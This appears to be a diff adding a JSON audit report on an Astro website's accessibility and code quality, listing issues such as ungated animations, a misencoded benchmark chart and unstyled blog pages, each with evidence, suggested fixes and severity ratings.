+   {
+    "effort_hours": 2,
+    "evidence": "Only TerminalDemo.astro (JS matchMedia guard, line 27) and ArchDiagram.astro (.ad-flow CSS media query, line 21) honor it. Ungated motion: (1) global.css line 71 `html { scroll-behavior: smooth; }` \u2014 smooth-scrolls every anchor/TOC jump regardless of preference; (2) index.astro line 61 hero badge `animate-fade-up`; (3) TerminalDemo caret `animate-pulse` runs forever; (4) ArchDiagram's two SMIL `<animateMotion dur=\"2s\" repeatCount=\"indefinite\">` token dots (lines 63-68) are immune to the CSS media query and loop infinitely for reduced-motion users.",
+    "fix": "Wrap smooth-scroll + define fade-up/pulse inside `@media (prefers-reduced-motion: no-preference)` in global.css; for the SMIL dots, gate via JS (matchMedia \u2192 circle.pauseAnimations() on the SVG root) since CSS cannot stop SMIL.",
+    "severity": "Medium",
+    "title": "prefers-reduced-motion only half-respected \u2014 global smooth scroll, hero animation, caret pulse, and SVG token dots ignore it"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "benchmarks.astro passes value/max to BarChart for BOTH charts; BarChart.astro line 28 sets width proportional to value. On 'Tokens / second (higher is better)' longest bar = best; on 'Time to first token (lower is better)' the LONGEST bar is the slowest model \u2014 the visual encoding contradicts the caption and the universal 'longer bar = more/better' reading. Secondary: tables (benchmarks.astro lines 52-71, 92-111) have no <caption> or scope=\"col\" on th.",
+    "fix": "For lower-is-better pass an inverted metric (e.g., width = best/value ratio, or precompute normalized width server-side like THROUGHPUT already normalizes max) and/or annotate the winner row. Add <caption class=\"sr-only\"> and scope=\"col\" to both tables.",
+    "severity": "Medium",
+    "title": "TTFT bar chart encodes 'lower is better' with longer-is-better bars \u2014 visual inversion misleads"
+   },
+   {
+    "effort_hours": 1.5,
+    "evidence": "WCAG 2.5.8 requires \u226524\u00d724px. Violations: playground.astro line 36 refresh-models button `rounded px-1 text-[10px]` (~18-20px tall); line 99 'Copy response' `px-2 py-0.5 text-xs` (~22px tall); code-block Copy buttons in InstallTabs.astro/FeatureTabs.astro/InstallCustomizer.astro `px-2 py-1 text-xs` (~24px, borderline); DocsLayout TOC links are bare text-sm rows ~18px tall with 6px gaps (spacing exception is marginal). Hamburger is h-9 w-9 (36px) \u2014 passes minimum but under the 44px comfort guideline.",
+    "fix": "Set a floor: `min-h-8 min-w-8` (32px) + px-3 py-1.5 on all icon/copy buttons; add py-1 to TOC links; consider h-11 w-11 for the mobile hamburger. Cheap class edits, big mobile-tap win.",
+    "severity": "Low",
+    "title": "Sub-24px touch targets on utility buttons and TOC rows"
+   },
+   {
+    "effort_hours": 1.5,
+    "evidence": "Header.astro lines 49-74: summary aria-label is hardcoded \"Open menu\" (never flips to 'Close' when open); no Escape-key or outside-click handler closes it (native details stays open); the hamburger svg lacks aria-hidden (FAQ accordion's identical svg correctly has aria-hidden=\"true\", FaqAccordion.astro line 14). Native details does give Enter/Space toggling, which is why this isn't Medium.",
+    "fix": "Add a 5-line script: on toggle set aria-label, on document keydown Escape \u2192 summary.click(), on outside pointerdown close; add aria-hidden=\"true\" to the svg. Or mirror the open state with CSS `[open] summary` styling and drop the label claim by giving the svg a visible label change.",
+    "severity": "Low",
+    "title": "Mobile menu details widget: static accessible name, no Escape/outside-click close, unlabeled icon"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "FaqAccordion.astro: questions are bare `<summary>` elements \u2014 fine interactively (native exclusive accordion via name=\"faq\", generous 56px targets), but users navigating by headings (the primary SR scanning strategy) hear no questions in the heading list. DocsLayout.astro line 119 renders a stray `<p class=\"mt-3 text-sm text-faint\">\u2014</p>` when toc.length===0 instead of suppressing the 'On this page' column content.",
+    "fix": "Wrap each summary in `<h3 class=\"m-0\">` (details-inside-heading is the documented accessible-accordion pattern). Replace the '\u2014' fallback with v-if-style rendering (hide the whole aside block when toc is empty on that breakpoint).",
+    "severity": "Low",
+    "title": "FAQ answers unreachable by heading navigation; empty TOC renders orphaned em-dash"
+   }
+  ],
+  "opportunities": [
+   "Mobile docs drawer: reuse the existing Header.astro <details>-disclosure pattern + DOCS_NAV config to render the sidebar twice (lg:block desktop, lg:hidden collapsible above the article) \u2014 restores search + section nav on phones/tablets for ~40 lines of Astro with zero new dependencies.",
+   "Contrast token upgrade path: bump --color-faint to ~#75907f (\u22655:1 on all three surfaces) OR introduce a 3-tier text scale (ink/muted/faint-with-restricted-use) documented in global.css comments so future components don't put faint text-xs on cards.",
+   "Shared interaction primitives: one focus-visible ring rule, one reduced-motion media block, one arrow-key tabs helper, and a Button-first CTA policy would close 5 of the 12 findings permanently and keep parity as pages are added.",
+   "Pre-launch trust work: replace PLACEHOLDER benchmark rows in src/data/benchmarks.ts with real suite output (or re-caption charts as 'illustrative') \u2014 the current 'Measured, not promised' headline sitting on invented numbers is a bigger UX/trust risk than any CSS issue found here.",
+   "Automated regression net: the site has no tests (known state) \u2014 add axe-core (via Playwright) + a contrast lint over compiled Tailwind classes in CI so the 1.92:1 button class and future regressions are caught at PR time rather than by audit."
+  ],
+  "score_0_10": 5,
+  "strengths": [
+   "Skip link done right: BaseLayout.astro lines 55-60 render a visually-hidden 'Skip to content' link that becomes visible on focus (positioned, branded, high-contrast) targeting #main, which PageLayout.astro line 19 guarantees on every route including docs/playground/benchmarks.",
+   "Clean document semantics verified in rendered HTML: exactly one h1 per page, SectionHeading emits h2 for every section, panels use h3 (home.html order confirmed: h1 \u2192 six h2 \u2192 h3s); landmarks present via header/nav[aria-label]/main/footer; aria-current=\"page\" used on desktop nav, mobile nav, and docs sidebar.",
+   "FAQ accordion is the model citizen: FaqAccordion.astro uses native <details name=\"faq\"> for an exclusive-open accordion \u2014 fully keyboard operable with zero JS, ~56px touch targets, chevron rotation as open-state cue, svg correctly aria-hidden.",
+   "Button.astro primary variant proves the team knows the right pattern \u2014 dark ink #04140d on emerald-400 computes to 7.45:1 (AAA); the failures are deviations from this component, not ignorance of it.",
+   "Playground error/empty-state handling is exemplary: placeholder prompt text in the output pane, and the fetch failure branch (playground.ts lines 224-229) prints a concrete CORS/server troubleshooting checklist naming the exact base URL \u2014 rare quality for an island this small.",
+   "Reduced-motion is respected in the two most animated components (TerminalDemo skips typing entirely and renders final state; ArchDiagram kills the dash animation), ArchDiagram SVG exposes role=\"img\" with a genuinely descriptive aria-label, and the 404 page offers clear recovery paths (Home/Docs) with themed, friendly copy."
+  ]
+ },
+ {
+  "dimension": "Code Quality & Architecture \u2014 website-astro (src/pages, layouts, components, content, scripts)",
+  "issues": [
+   {
+    "effort_hours": 0.5,
+    "evidence": "src/pages/changelog/index.astro:48 uses `<Fragment set:html={entry.body} />`. In Astro's content layer `entry.body` is the RAW markdown string, not rendered HTML. Verified in dist/changelog/index.html: literal text `## Production readiness`, `### Breaking changes`, `- Weak JWT secrets now **disable** JWT auth\u2026` renders as plain paragraphs. All three entries (v0.2.0\u2013v0.4.0) show markdown source on the live page.",
+    "fix": "In the frontmatter add `const { Content } = await render(entry)` per entry (map first: `await Promise.all(entries.map(async e => ({...e, Content: (await render(e)).Content})))`) and replace the Fragment/set:html with `<Content />` inside `<div class=\"prose-doc mt-4\">`.",
+    "severity": "Critical",
+    "title": "Changelog index page renders raw, unrendered markdown as plain text"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": ".prose-doc styling lives ONLY in DocsLayout.astro's default-scoped <style> block; compiled CSS is `.prose-doc[data-astro-cid-ccykbmgk] h2 {\u2026}` etc. (dist/_astro/DocsLayout.BVc3Un6R.css). But `class=\"prose-doc\"` is also used by src/pages/blog/[...slug].astro:27, src/pages/changelog/[...slug].astro:26, src/pages/changelog/index.astro:47, privacy.astro, terms.astro \u2014 none of which render DocsLayout or its CID. Verified dist/blog/pooling-consumer-gpus/index.html: div has `class=\"prose-doc mt-8\"` with NO data-astro-cid attribute and loads only /_astro/PageLayout.D8EWlqsA.css. Result: headings, code blocks, tables, links, and paragraph spacing are completely unstyled on every blog post, release-notes page, and legal page.",
+    "fix": "Move the .prose-desc rules out of DocsLayout into src/styles/global.css as unscoped rules (plain CSS or an @utility), or create a shared Prose.astro wrapper component whose scoped style targets :global(.prose-doc \u2026) and use it in all five call sites.",
+    "severity": "Critical",
+    "title": "prose-doc styles are scoped to DocsLayout \u2014 blog, changelog detail, privacy, and terms pages get zero typography"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "src/data/benchmarks.ts THROUGHPUT mixes units: ttft \"38 ms\" \u2026 \"1.1 s\" (line 16). benchmarks.astro:40 computes `value: parseFloat(r.ttft)` \u2192 parseFloat(\"1.1 s\") = 1.1, then BarChart width = value/max*100 clamped to 3%. Verified rendered output (dist/benchmarks/index.html and live :4321): TTFT chart widths end `\u202663%, 100%, 3%` \u2014 TinyStories-1M (fastest, 38 ms) gets a small bar while Llama-3.1-70B (slowest, 1100 ms) gets the smallest bar. On a page headlined \"Measured, not promised\" this is both a visual lie and an integrity problem given the numbers are already acknowledged placeholders.",
+    "fix": "Store numeric fields in BenchRow (`tpsValue: number, ttftMs: number`) and format for display via a helper (e.g. lib/format.ts `formatTtft(ms)`), or parse with a unit-aware function in benchmarks.astro. While touching it: mark placeholder rows visibly (\"illustrative\") until real measurements exist, since METHODOLOGY claims 'Every number is produced by the built-in benchmark suite'.",
+    "severity": "High",
+    "title": "TTFT bar chart parses mixed units \u2014 slowest 70B model renders as the FASTEST bar"
+   },
+   {
+    "effort_hours": 0.3,
+    "evidence": "src/data/pricing.ts exports PRICING with tiers Community/$0, Pro/$29-month ('featured'), Enterprise/Contact Us \u2014 zero imports anywhere (grep across src finds only the definition). Meanwhile index.astro:179 ships 'Free. Forever. For everyone. \u2026 There is no paid tier, no license key, and no feature gate'. If ever wired back in it would directly falsify the homepage. Same file family: components/PricingCard.astro is referenced by no page.",
+    "fix": "Delete src/data/pricing.ts and src/components/PricingCard.astro (git history preserves them if a paid tier ever ships). This also clears future confusion about which pricing story is canonical.",
+    "severity": "High",
+    "title": "Dead PRICING data contradicts the site's own 'no paid tier' messaging"
+   },
+   {
+    "effort_hours": 1,
+    "evidence": "`npx astro check` itself flags them (ts(6133)): index.astro:4 `import InstallTabs`, index.astro:36 `const INSTALL_TABS = [\u2026]`, index.astro:8 `import StatBand`. Neither component is used anywhere else (grep: only definitions). Index.astro re-implements StatBand's exact markup inline at lines 119-124 (`rounded-2xl border border-line bg-surface p-6 shadow-sm` + text-gradient value). Also dead: `getDocsNav()` in src/config/docs-nav.ts:54 (never called), `SITE` import in Footer.astro:2, `A100_TPS = 60` in CostCalculator.astro:69 (declared, never used \u2014 the calculator prices cloud by uptime only, so the stated '60 tokens/sec on the rented instance' assumption is silently dropped from the math).",
+    "fix": "Delete INSTALL_TABS + InstallTabs import from index.astro; delete src/components/InstallTabs.astro and src/components/StatBand.astro (either delete StatBand or replace the inline stat grid with it \u2014 don't keep both); remove getDocsNav(), Footer's SITE import, and either use A100_TPS in the verdict copy or delete it.",
+    "severity": "Medium",
+    "title": "Dead code left behind by the InstallCustomizer swap (InstallTabs, INSTALL_TABS, StatBand) plus other unused exports"
+   },
+   {
+    "effort_hours": 0.7,
+    "evidence": "Default base URL defined twice: src/pages/playground.astro:25 `value=\"http://localhost:8000\"` and src/scripts/playground.ts:25 `localStorage.getItem(\"pg-base-url\") ?? \"http://localhost:8000\"` \u2014 change one and they diverge (SSR value would win until first send persists localStorage). TerminalDemo.astro duplicates its command/output strings in two branches (lines 28-34 reduced-motion vs 40-47 animation) including hardcoded `http://localhost:8000/v1`. index.astro hero badge hardcodes 'v0.4.1' (line 62) while src/content/changelog/ has no v0.4.1 entry (only v0-2-0/v0-3-0/v0-4-0) \u2014 version is announced but absent from the release history it links toward.",
+    "fix": "Add `demoApiUrl: \"http://localhost:8000\"` (and current version) to config/site.ts; pass into playground.astro input value and import in playground.ts (it can read a data attribute or share a tiny constants module under src/config). Extract TerminalDemo's cmd/outputLines to module-level consts. Publish a v0.4.1 changelog entry to match the PyPI release.",
+    "severity": "Medium",
+    "title": "Playground default base URL and demo strings hardcoded in multiple places instead of config/site.ts"
+   },
+   {
+    "effort_hours": 1.5,
+    "evidence": "docs-nav.ts:6-52 hand-lists all 17 slugs with group labels; content.config.ts separately validates group/order frontmatter; docs/index.astro:18-24 iterates DOCS_NAV groups and sorts members by frontmatter `order`. Consequence: adding src/content/docs/new-guide.mdx builds /docs/new-guide/ via [...slug].astro getStaticPaths, but it appears in NO sidebar, NO docs index, and getDocNeighbors skips it \u2014 a silent orphan page. Currently in sync (17 files = 17 nav items) but nothing enforces it.",
+    "fix": "Either derive navigation from the collection (getCollection('docs') grouped by data.group, sorted by data.order \u2014 DOCS_NAV then only holds display order of groups), or add a build-time assertion script/test that fails when `getCollection('docs')` contains a slug absent from DOCS_NAV (and vice versa).",
+    "severity": "Medium",
+    "title": "DOCS_NAV duplicates collection metadata with no drift validation \u2014 new docs can silently orphan"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "CostCalculator.astro lines 29/34/39 ship `$73`, `~$8`, `$780` as initial markup, but the script's render() (lines 84-96) computes cloudMonthly = 1.9 \u00d7 720 = $1,368 and savings \u2248 $16,000/yr. Users see a flash of $73\u2192$1,368 on load; users without JS see permanently wrong numbers. The static trio looks like leftovers from an older pricing model.",
+    "fix": "Compute the defaults at build time in the frontmatter (same formulas server-side) and inject them into the markup so SSR === hydrated state, or blank the spans until render() runs. Add a noscript note ('enable JavaScript for live estimates').",
+    "severity": "Medium",
+    "title": "CostCalculator static HTML disagrees with its own script's math"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "tsconfig extends astro/tsconfigs/strict (good), but: DocsLayout.astro:128 `let pagefind: any = null`, :133 `results: any[]`, :178 `(r: any) => r.data()` \u2014 while src/pagefind.d.ts declares the module as `const pagefind: any` anyway, and the dynamic import goes through a variable specifier (`pfSpecifier`, line 160-161) that bypasses the declaration entirely, making pagefind.d.ts dead weight; playground.ts:50-53 four `q.get(...)!` non-null assertions (guarded by q.has, but fragile if edited); ~20 casts like `($(\"baseUrl\") as HTMLInputElement)` where the `$()` helper could carry the type; InstallCustomizer.astro:72-76 and CostCalculator.astro:57-64 eight `!` assertions on querySelector. Scroll-spy (DocsLayout:191) also relies on `l.dataset.tocLink!`.",
+    "fix": "Type the Pagefind surface minimally ({ search(q): Promise<{results: {data(): Promise<PagefindHit>}[]}>; options(o): Promise<void> }) and delete or honor pagefind.d.ts; give the `$` helper a generic parameter at call sites (`$<HTMLInputElement>(\"baseUrl\")`) to eliminate the as-casts; replace `q.get()!` chains with a single `const num = (k, fb) => Number(q.get(k) ?? fb)` style parser.",
+    "severity": "Medium",
+    "title": "TypeScript strictness escapes: any-typed Pagefind layer, non-null assertions, and cast-heavy DOM lookups"
+   },
+   {
+    "effort_hours": 2,
+    "evidence": "InstallTabs.astro:43-61 ([data-tab-btn]/[data-tab-panel]), FeatureTabs.astro:58-78 ([data-ftab-btn]/[data-ftab-panel]), and playground.ts:257-272 wireLangTabs ([data-pg-lang]) each re-implement click \u2192 aria-selected toggle \u2192 class juggling \u2192 hidden panels. InstallTabs is already slated for deletion; FeatureTabs and playground remain near-clones. Related naming inconsistency: global.css defines an inverted brand ramp (brand-500 #10b981 darker than brand-600 #34d399, 700-900 getting lighter), which is why Button.astro primary is `bg-brand-500 text-[#04140d]` while Header.astro:44-45 hand-rolls `bg-brand-600 \u2026 text-white` and playground.astro:79 uses `bg-brand-600 text-white` \u2014 three different primary-button looks for one brand.",
+    "fix": "Extract one initTabs(root, {btnAttr, panelAttr}) util into src/scripts/ and reuse in FeatureTabs + playground. Replace Header's and the playground's hand-styled CTAs with the Button component. Document the brand-ramp inversion in global.css comments (or renumber) so '600 = primary action' means one thing.",
+    "severity": "Low",
+    "title": "Three hand-rolled tab widgets with duplicated switch logic; inconsistent primary-button styling across components"
+   },
+   {
+    "effort_hours": 0.5,
+    "evidence": "`npx astro check`: 31 hints, 0 errors. Notables beyond the dead-code ts(6133)s above: content.config.ts \u2014 24\u00d7 ts(6385) \"'z' is deprecated\" (importing z from astro:content is deprecated in Astro 7); BaseLayout.astro:47 and :51 astro(4000) 'add is:inline explicitly'. Separately, Logo.astro's `id=\"dl-grad\"` is emitted twice per page (Header + Footer both mount it) \u2014 duplicate DOM ids that happen to resolve; public/manifest.webmanifest has `background_color: \"#fdfdfb\"` (near-WHITE) and `theme_color: \"#10b981\"` while BaseLayout sets theme-color #060907; stray generator logs og_dark.txt / og_gen4.txt sit at website-astro root; learn.astro levelColors defines an 'Advanced' key no track uses; changelog schema has no draft field unlike blog; blog updatedDate is validated but never rendered anywhere.",
+    "fix": "Migrate content.config.ts to `import { z } from \"astro/zod\"`; add `is:inline` to both BaseLayout scripts; generate a unique gradient id per Logo instance (use Astro's `Astro.props` + counter or just inline the gradient stops); sync manifest colors to the dark theme (#060907 / brand); delete og_*.txt (or move under scripts/ and gitignore); drop the Advanced key; decide draft support for changelog and either render updatedDate or drop it from the schema.",
+    "severity": "Low",
+    "title": "astro check hints: deprecated zod import path, implicit is:inline scripts, duplicate SVG ids, mismatched manifest colors"
+   }
+  ],
+  "opportunities": [
+   "Single-source product facts: version, demo base URL, GitHub URL, and license already partially live in config/site.ts \u2014 extend it so the hero badge version, changelog, and TerminalDemo can never drift apart",
+   "Introduce a tiny vitest/smoke-test suite (the site has none): assert every docs slug is in DOCS_NAV, every internal href resolves to a built route, PRICING-style dead exports don't return, and benchmarks.ts numeric fields stay unit-consistent",
+   "Adopt Astro's markeddown-rendering convention everywhere: grep for `set:html={.*body}` as a lint rule \u2014 the changelog bug is exactly the anti-pattern it catches",
+   "If benchmarks remain illustrative, add a visible 'Illustrative targets \u2014 real measurements coming' banner driven by a flag in benchmarks.ts (e.g. `export const IS_PLACEHOLDER = true`) so flipping it to real data flips the page copy automatically",
+   "Consider extracting the repeated card-grid markup (rounded-2xl border border-line bg-surface p-N shadow-* wrappers appear in ~8 variants across index/use-cases/glossary/integrations/benchmarks) into one Card.astro with size props",
+   "When committing website-astro for the first time, verify .gitignore covers node_modules/, dist/, .astro/, and the og_*.txt logs so the initial commit stays clean"
+  ],
+  "score_0_10": 5.5,
+  "strengths": [
+   "npx astro check passes: 0 errors, 31 hints \u2014 all hints actionable and enumerated above; tsconfig.json correctly extends astro/tsconfigs/strict",
+   "SectionHeading usage is genuinely consistent: eyebrow/title/lead pattern applied uniformly across all 12 marketing pages (index, benchmarks, playground, blog index, changelog index, community, learn, security, use-cases, integrations, comparisons, glossary)",
+   "Clean data/presentation separation: src/data/*.ts holds ALL copy for comparisons, glossary, use-cases, integrations, benchmarks, features; config/site.ts centrally owns NAV, FOOTER_COLUMNS, github URL, and Plausible domain, consumed by Header/Footer/BaseLayout (canonical + OG all derived from SITE.url)",
+   "Content collections fully typed with zod schemas incl. enums (group) and coercion (dates); drafts filtered consistently in blog list/detail/RSS",
+   "Strong no-framework discipline: zero React/Preact \u2014 vanilla TS islands (playground.ts, FeatureTabs, TerminalDemo, CostCalculator) with a single delegated [data-copy] listener in BaseLayout instead of per-component clipboard code",
+   "Good accessibility baseline: skip-link, aria-current nav states, role=tablist/tabpanel wiring, aria-label on icon-only controls, role=img + aria-label on charts/SVG, prefers-reduced-motion honored in both TerminalDemo and ArchDiagram animations",
+   "SEO plumbing complete and DRY: canonical URLs, OG/Twitter tags, JSON-LD (SoftwareApplication + WebSite on home), sitemap + RSS (rss.xml, changelog.xml) + robots.txt pointing at the sitemap; Plausible gated behind import.meta.env.PROD",
+   "netlify.toml sets immutable long-cache for hashed /_astro/* assets"
+  ]
+ }
+]
